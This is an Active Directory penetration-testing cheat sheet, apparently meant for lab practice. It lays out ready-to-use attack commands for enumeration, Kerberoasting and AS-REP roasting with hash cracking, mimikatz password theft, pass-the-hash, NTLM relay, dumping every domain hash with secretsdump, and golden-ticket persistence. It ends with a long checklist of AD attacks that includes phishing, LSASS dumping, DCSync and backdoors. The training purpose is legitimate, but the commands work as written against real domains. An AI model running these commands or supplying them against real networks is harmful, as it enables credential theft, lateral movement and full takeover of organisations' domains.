**üî• Step-by-Step AD Pentesting Cheat Sheet**

## **1Ô∏è‚É£ Enumeration (Always Start Here!)**

Your goal: **Find Users, Computers, Groups, and AD Misconfigurations.**

üîπ **Basic Enumeration (No Credentials)** ‚úÖ `nmap -p 88,135,139,389,445,464,593,636,3268,3389 --script=ldap* --script=smb* <target>`  
‚úÖ `smbclient -L //target -N` ‚Üí Check SMB Shares  
‚úÖ `crackmapexec smb <target>` ‚Üí Check SMB, Users, and Shares  
‚úÖ `kerbrute userenum -d domain.com --dc <DC-IP> usernames.txt` ‚Üí Find Valid Users

üîπ **Detailed Enumeration (With Credentials)** ‚úÖ `bloodhound-python -u user -p pass -d domain.com -c All -dc-ip <DC-IP>` ‚Üí Full AD Mapping  
‚úÖ `rpcclient -U 'user%pass' <DC-IP>` ‚Üí Query AD Info  
‚úÖ `net group "Domain Admins" /domain` ‚Üí Check Domain Admins  
‚úÖ `net user /domain` ‚Üí List All Users  
‚úÖ `crackmapexec ldap <DC-IP> -u user -p pass --asreproast` ‚Üí Check for AS-REP Roastable Accounts

üìå **If You Find Null SMB Shares or Weak Users ‚Üí Move to Exploitation.**

---

## **2Ô∏è‚É£ Exploitation (Privilege Escalation & Lateral Movement)**

Your goal: **Escalate Privileges from a Low-Level User.**

üîπ **Kerberoasting (If Kerberos Enabled)** ‚úÖ `GetUserSPNs.py -dc-ip <DC-IP> domain/user:pass -request`  
‚úÖ `john --wordlist=rockyou.txt hash.txt`

üîπ **AS-REP Roasting (If User Doesn‚Äôt Require Pre-Auth)** ‚úÖ `GetNPUsers.py -dc-ip <DC-IP> -usersfile users.txt domain/ -format hashcat`  
‚úÖ `hashcat -m 18200 hash.txt rockyou.txt --force`

üîπ **Pass-the-Hash / Pass-the-Ticket (Lateral Movement)** ‚úÖ `mimikatz.exe` ‚Üí `sekurlsa::logonpasswords` ‚Üí Steal Passwords  
‚úÖ `psexec.py domain/user@target -hashes LM:NT`

üîπ **NTLM Relay Attacks (If SMB Signing is Disabled)** ‚úÖ `ntlmrelayx.py -t smb://target --smb2support`

üìå **If you get a higher-privilege account ‚Üí Use It for Full Compromise.**

---

## **3Ô∏è‚É£ Full Domain Compromise (Domain Admin Access!)**

Your goal: **Get Domain Admin and Dump All Passwords.**

üîπ **Check if You Are a Domain Admin** ‚úÖ `whoami /groups`  
‚úÖ `net group "Domain Admins" /domain`

üîπ **Dump All AD Hashes (If DA Access)** ‚úÖ `secretsdump.py -dc-ip <DC-IP> domain/admin:password@target`

üîπ **Golden Ticket Attack (Persistence)** ‚úÖ `mimikatz.exe` ‚Üí `kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-XXXXX /krbtgt:HASH /ptt`

üìå **Once You Get DA ‚Üí You Have Fully Compromised the Domain!**

---

## **üî• How to Know What to Use in a Lab? (Decision-Making Tree)**

‚úÖ **1. Do I have credentials?**

- ‚ùå No ‚Üí **Start with Enumeration**
    
- ‚úÖ Yes ‚Üí **Use BloodHound & CrackMapExec**
    

‚úÖ **2. Can I Kerberoast / AS-REP Roast?**

- ‚úÖ Yes ‚Üí **Extract Hashes & Crack Them**
    
- ‚ùå No ‚Üí **Try Lateral Movement**
    

‚úÖ **3. Do I have SMB, LDAP, or Kerberos Misconfigurations?**

- ‚úÖ Yes ‚Üí **Exploit Using NTLM Relay, Pass-the-Hash, or Kerberos Attacks**
    
- ‚ùå No ‚Üí **Look for Local Privilege Escalation on Workstations**
    

‚úÖ **4. Do I have Domain Admin access?**

- ‚úÖ Yes ‚Üí **Dump Hashes & Maintain Access**
    
- ‚ùå No ‚Üí **Pivot to Another User or Machine**
    

---

## **üî• Next Steps for You**

- Use this **step-by-step method in any AD lab**.
    
- Start practicing **each attack individually on TryHackMe (THM) & Hack The Box (HTB).**
    
- Use **BloodHound** to **visualize attack paths** (this helps a lot).
    
- If stuck, **Google specific errors & read writeups** (everyone does this, even pros).
    

---

- [ ] **1. Initial Access**
  - [ ] 1.1 Phishing Attack: Sending a malicious email to a user that executes malware or a payload.
  - [ ] 1.2 Malicious Attachments / Macros: Injecting macro-based payloads into Word/Excel files.
  - [ ] 1.3 Credential Stuffing: Attempting logins using leaked passwords.
  - [ ] 1.4 Pass-the-Cookie Attack: Hijacking a session by stealing web session cookies.
  - [ ] 1.5 Pass-the-Ticket Attack: Reusing an active Kerberos ticket.
  - [ ] 1.6 Malicious USB / Rubber Ducky: Infiltrating the network via physical access.
  - [ ] 1.7 Exposed SMB Shares: Stealing confidential files from public SMB shares.
  - [ ] 1.8 VPN Credential Hijacking: Capturing remote VPN login credentials.
  - [ ] 1.9 Zero-Day Exploitation: Exploiting unpatched vulnerabilities (e.g., Log4Shell).
  - [ ] 1.10 LLMNR/NBT-NS Poisoning: Stealing credentials by intercepting name resolution queries.
  - [ ] 1.11 Evil Twin Attack: Capturing credentials from a fake Wi-Fi access point.
  - [ ] 1.12 Watering Hole Attack: Targeting users by placing malware on trusted websites.
  - [ ] 1.13 Supply Chain Attack: Infiltrating via third-party software or services.

- [ ] **2. Credential Dumping Attacks**
  - [ ] 2.1 Mimikatz Attack: Extracting plain text passwords and hashes from LSASS memory.
  - [ ] 2.2 DCSync Attack: Obtaining NTLM hashes directly from a domain controller.
  - [ ] 2.3 LSASS Dumping: Extracting passwords by dumping the LSASS process.
  - [ ] 2.4 SAM & SYSTEM Hive Dumping: Obtaining local password hashes.
  - [ ] 2.5 Kerberos Ticket Extraction: Capturing active Kerberos tickets (TGT/TGS).
  - [ ] 2.6 NTDS.dit Dumping: Extracting all user credentials from the domain controller database.
  - [ ] 2.7 WDigest Credential Theft: Obtaining plain text passwords from Windows memory.
  - [ ] 2.8 LSASS Memory Injection: Stealing credentials by injecting malicious code into LSASS.
  - [ ] 2.9 Cached Credentials Dumping: Extracting and cracking stored mscache credentials.
  - [ ] 2.10 Browser Credential Theft: Stealing passwords and cookies stored in browsers.
  - [ ] 2.11 DPAPI Attack: Decrypting encrypted data by abusing the Data Protection API.

- [ ] **3. Privilege Escalation Attacks**
  - [ ] 3.1 Kerberoasting: Extracting user passwords by cracking Kerberos service ticket hashes.
  - [ ] 3.2 AS-REP Roasting: Brute-forcing Kerberos AS-REP responses.
  - [ ] 3.3 Token Impersonation Attack: Stealing the security token of a high-privilege user.
  - [ ] 3.4 Pass-the-Hash Attack: Bypassing authentication with NTLM hashes.
  - [ ] 3.5 Print Spooler Exploit: Gaining SYSTEM access from the Print Spooler service.
  - [ ] 3.6 Unconstrained Delegation Abuse: Stealing NTLM hashes of unconstrained delegation users.
  - [ ] 3.7 Constrained Delegation Abuse: Abusing the Kerberos delegation feature.
  - [ ] 3.8 Local Privilege Escalation: Gaining admin privileges from system vulnerabilities (CVEs).
  - [ ] 3.9 SeBackupPrivilege Abuse: Abusing privileges to copy sensitive files.
  - [ ] 3.10 SeRestorePrivilege Abuse: Abusing privileges to modify registry or files.
  - [ ] 3.11 Kerberos S4U2Self Abuse: Abusing the S4U2Self protocol to create tickets.
  - [ ] 3.12 Kerberos S4U2Proxy Abuse: Abusing S4U2Proxy for unauthorized access.
  - [ ] 3.13 DNSAdmins Group Abuse: Having DNSAdmins members load malicious DLLs.
  - [ ] 3.14 AD Certificate Services Attack: Abusing AD Certificate Services to issue unauthorized certificates.

- [ ] **4. Lateral Movement**
  - [ ] 4.1 Pass-the-Hash: Lateral movement from a compromised machine to another.
  - [ ] 4.2 Pass-the-Ticket: Accessing machines by reusing Kerberos TGTs.
  - [ ] 4.3 SMB Relay Attack: Exploiting SMB and LDAP services by relaying NTLM.
  - [ ] 4.4 PSExec Attack: Executing commands with SYSTEM access on remote machines.
  - [ ] 4.5 RDP Hijacking: Hijacking active RDP sessions without credentials.
  - [ ] 4.6 WMI Lateral Movement: Remote system control via Windows Management Instrumentation.
  - [ ] 4.7 BloodHound Enumeration: Finding high-privilege users and attack paths in AD.
  - [ ] 4.8 DCOM Lateral Movement: Remote code execution via DCOM.
  - [ ] 4.9 WinRM Lateral Movement: Running remote commands via Windows Remote Management.
  - [ ] 4.10 Printer Bug: Lateral movement via printer service vulnerabilities.
  - [ ] 4.11 PetitPotam: Compromising domain controllers with NTLM relay attacks.
  - [ ] 4.12 Domain Trust Attacks: Abusing inter-domain trust relationships.
  - [ ] 4.13 Forest Trust Attacks: Exploiting inter-forest trust relationships.

- [ ] **5. Persistence & Domain Takeover**
  - [ ] 5.1 Golden Ticket Attack: Domain takeover by creating unlimited Kerberos TGTs.
  - [ ] 5.2 Silver Ticket Attack: Gaining access by creating Kerberos TGS for specific services.
  - [ ] 5.3 Skeleton Key Attack: Injecting a universal password on domain controllers.
  - [ ] 5.4 AdminSDHolder Abuse: Modifying permissions of protected accounts.
  - [ ] 5.5 GPO Hijacking: Deploying malicious Group Policy Objects.
  - [ ] 5.6 SID History Injection: Escalating privileges by creating fake SID history.
  - [ ] 5.7 Shadow Credentials Attack: Gaining unauthorized access by abusing Key Trust authentication.
  - [ ] 5.8 RBCD Attack (Resource-Based Constrained Delegation Attack): Exploiting AD's delegation mechanisms.
  - [ ] 5.9 DCShadow Attack: Making arbitrary changes by abusing domain controller replication rights.
  - [ ] 5.10 WMI Event Subscription: Setting up persistent backdoors with WMI events.
  - [ ] 5.11 Registry Run Keys: Running malicious programs at startup by modifying the registry.
  - [ ] 5.12 AD Recycle Bin Exploitation: Restoring deleted objects for backdoor access.
  - [ ] 5.13 AD FS Token Forgery: Creating fake tokens by stealing ADFS token signing certificates.
  - [ ] 5.14 Azure AD Connect Exploitation: Accessing hybrid environments by compromising sync accounts.

- [ ] **6. NTLM & Kerberos Exploitation**
  - [ ] 6.1 NTLM Relay Attack: Gaining unauthorized access by relaying NTLM authentication requests.
  - [ ] 6.2 NTLMv1 Downgrade Attack: Brute-forcing by downgrading NTLM authentication.
  - [ ] 6.3 Kerberos Downgrade Attack: Downgrading Kerberos to weaker encryption modes.
  - [ ] 6.4 Kerberos Overpass-the-Hash: Bypassing authentication without Kerberos tickets.
  - [ ] 6.5 Brute-Force Kerberos Pre-Auth: Attacking pre-auth disabled users.
  - [ ] 6.6 PAC Tampering Attack: Modifying Kerberos PAC.
  - [ ] 6.7 TGT Delegation Abuse: Using Kerberos delegation to use another user's ticket.
  - [ ] 6.8 Kerberos Bronze Bit Attack: Bypassing PAC validation for unauthorized access.
  - [ ] 6.9 LDAP Relay Attack: Gaining unauthorized access by relaying LDAP authentication requests.

- [ ] **7. Data Exfiltration & Domain Persistence**
  - [ ] 7.1 LdapDomainDump Attack: Extracting sensitive information from LDAP enumeration.
  - [ ] 7.2 Group Policy Preference Exploit: Dumping stored credentials from GPP XML files.
  - [ ] 7.3 LSA Secrets Dumping: Extracting Local Security Authority secrets.
  - [ ] 7.4 SYSVOL Credential Theft: Recovering plain text credentials from SYSVOL shares.
  - [ ] 7.5 MSSQL Server Exploitation: Privilege escalation from AD integrated MSSQL databases.
  - [ ] 7.6 VSS Shadow Copy Exploit: Extracting passwords and sensitive data from Windows VSS.
  - [ ] 7.7 Cloud Sync Attack: Exploiting the sync process of hybrid AD and Azure AD.
  - [ ] 7.8 ADFS Token Signing Certificate Theft: Stealing ADFS server certificates to create fake tokens.
  - [ ] 7.9 Azure AD Attacks: Exploiting Azure AD misconfigurations or weak permissions.

- [ ] **8. Miscellaneous AD Attacks**
  - [ ] 8.1 AD Reconnaissance with PowerView: Detailed enumeration of the AD environment with PowerView.
  - [ ] 8.2 AD Object Permission Abuse: Abusing excessive permissions for unauthorized changes.
  - [ ] 8.3 Kerberos Unconstrained Delegation Abuse: Capturing TGTs from unconstrained delegation.
